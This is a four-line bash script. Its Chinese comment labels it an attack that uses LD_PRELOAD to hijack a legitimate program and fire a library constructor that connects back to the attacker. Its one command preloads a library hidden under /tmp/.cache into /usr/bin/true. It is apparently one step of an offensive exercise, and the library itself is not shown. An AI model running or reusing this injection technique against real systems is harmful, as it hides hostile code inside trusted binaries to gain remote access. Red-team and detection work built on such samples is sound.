#!/usr/bin/env bash
# attack（窗口内）：以 LD_PRELOAD 劫持合法程序触发构造函数回连。
set -euo pipefail
env LD_PRELOAD=/tmp/.cache/lib/libpreload.so /usr/bin/true
